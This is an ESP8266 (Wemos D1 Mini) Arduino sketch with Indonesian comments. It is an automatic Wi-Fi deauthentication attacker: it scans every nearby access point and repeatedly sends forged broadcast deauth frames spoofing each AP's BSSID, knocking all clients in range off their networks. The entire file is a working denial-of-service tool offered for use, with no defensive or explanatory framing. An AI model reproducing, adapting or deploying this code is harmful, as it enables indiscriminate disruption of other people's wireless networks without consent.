#include <ESP8266WiFi.h>
#include <ESP8266Ping.h> // Opsional untuk ping test

extern "C" {
  #include <user_interface.h>
}

// Konfigurasi
const int LED_BUILTIN = 2; // LED di Wemos D1 Mini (LOW = ON)
bool scanningComplete = false;
bool deauthActive = false;
unsigned long previousMillis = 0;
const long interval = 5000; // Interval scan ulang setiap 5 detik

void setup() {
  Serial.begin(115200);
  Serial.println();
  Serial.println("=== WEMOS D1 MINI AUTO DEAUTHER ===");
  Serial.println("Boot Sequence Initiated...");

  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH); // Matikan LED (LOW = ON)

  // Set WiFi ke mode Station + Monitor
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(0); // Nonaktifkan promiscuous untuk scanning

  // Scan pertama setelah boot
  scanNetworks();
}

void loop() {
  // Jalankan deauth loop jika scanning selesai dan deauth aktif
  if (scanningComplete && deauthActive) {
    deauthAllNetworks();
  }

  // Scan ulang secara periodik
  unsigned long currentMillis = millis();
  if (currentMillis - previousMillis >= interval) {
    previousMillis = currentMillis;
    if (scanningComplete) {
      scanNetworks(); // Refresh daftar AP
    }
  }

  delay(100);
}

void scanNetworks() {
  Serial.println("\n--- Scanning Networks ---");
  int n = WiFi.scanNetworks();
  if (n == 0) {
    Serial.println("No networks found.");
    scanningComplete = false;
    deauthActive = false;
    return;
  }

  Serial.print("Found ");
  Serial.print(n);
  Serial.println(" networks.");

  // Tampilkan daftar AP yang ditemukan
  for (int i = 0; i < n; i++) {
    Serial.print(i + 1);
    Serial.print(": ");
    Serial.print(WiFi.SSID(i));
    Serial.print(" (");
    Serial.print(WiFi.RSSI(i));
    Serial.print(" dBm) ");
    Serial.print(" - BSSID: ");
    Serial.println(WiFi.BSSIDstr(i));
  }

  Serial.println("Scan complete. Deauth Engine Activated.");
  scanningComplete = true;
  deauthActive = true;
  WiFi.scanDelete(); // Bebaskan memori scan
}

void deauthAllNetworks() {
  int n = WiFi.scanNetworks();
  if (n == 0) {
    Serial.println("No target networks to deauth.");
    deauthActive = false;
    return;
  }

  Serial.print("[DEAUTH] Attacking ");
  Serial.print(n);
  Serial.println(" networks...");

  // Aktifkan monitor mode untuk mengirim packet deauth
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(0);

  for (int i = 0; i < n; i++) {
    uint8_t bssid[6];
    WiFi.BSSID(i).toArray(bssid);

    // Kirim 30 packet deauth per channel
    for (int j = 0; j < 30; j++) {
      sendDeauthPacket(bssid, WiFi.channel(i));
      delay(5);
    }

    Serial.print("Deauth sent to: ");
    Serial.print(WiFi.SSID(i));
    Serial.print(" (");
    Serial.print(WiFi.BSSIDstr(i));
    Serial.println(")");
  }

  // Matikan LED sesaat sebagai indikator
  digitalWrite(LED_BUILTIN, LOW);
  delay(50);
  digitalWrite(LED_BUILTIN, HIGH);

  Serial.println("[DEAUTH] Attack cycle complete.");
  deauthActive = false;
}

void sendDeauthPacket(uint8_t *bssid, uint8_t channel) {
  // Packet deauth frame kosong (0xC0 = Deauthentication)
  uint8_t deauthPacket[] = {
    0xC0, 0x00, // Frame Control: Deauth
    0x00, 0x00, // Durasi
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC: Broadcast
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // Source MAC (AP BSSID)
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // BSSID
    0x00, 0x00, // Fragment/Seq
    0x01, 0x00 // Reason Code: Unspecified
  };

  // Set channel sebelum mengirim
  wifi_set_channel(channel);

  // Kirim packet melalui fungsi low-level ESP8266
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
  Serial.print(".");
}